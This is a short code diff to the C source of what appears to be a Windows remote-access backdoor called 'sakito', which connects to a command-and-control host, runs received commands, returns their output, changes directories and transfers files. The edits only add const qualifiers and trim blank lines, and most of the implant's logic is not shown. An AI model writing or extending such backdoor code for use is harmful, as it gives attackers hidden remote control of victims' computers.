@@ -7,7 +7,6 @@ Use educationally/legally.
 #include <direct.h>
 #include <errno.h>
 #include <stdio.h>
-
 #include "headers/sakito_core.h"
 
 #define HOST "127.0.0.1"
@@ -51,7 +50,7 @@ int c2_connect(const SOCKET connect_socket) {
 	return SUCCESS;
 }
 
-int send_pipe_output(HANDLE child_stdout_read, char* const buf, SOCKET connect_socket) {
+int send_pipe_output(HANDLE child_stdout_read, char* const buf, const SOCKET connect_socket) {
 	DWORD bytes_read; 
 	while (1) {
 		// Read stdout, stderr bytes from pipe.
@@ -101,7 +100,7 @@ int exec_cmd(const SOCKET connect_socket, char* const buf) {
 	return send_pipe_output(child_stdout_read, buf, connect_socket);
 }
 
-int ch_dir(char* const dir, SOCKET connect_socket) {
+int ch_dir(char* const dir, const SOCKET connect_socket) {
 	char chdir_result[] = "1";
 	_chdir(dir);
 
@@ -175,7 +174,7 @@ int recv_file(const SOCKET connect_socket, char* const buf) {
 	return i_result;
 }
 
-int send_cwd(char* const buf, SOCKET connect_socket) {
+int send_cwd(char* const buf, const SOCKET connect_socket) {
 	// Store working directory in buf.
 	GetCurrentDirectory(BUFLEN, buf);
 
@@ -256,4 +255,3 @@ int main(void) {
 
 	return FAILURE;
 }
-
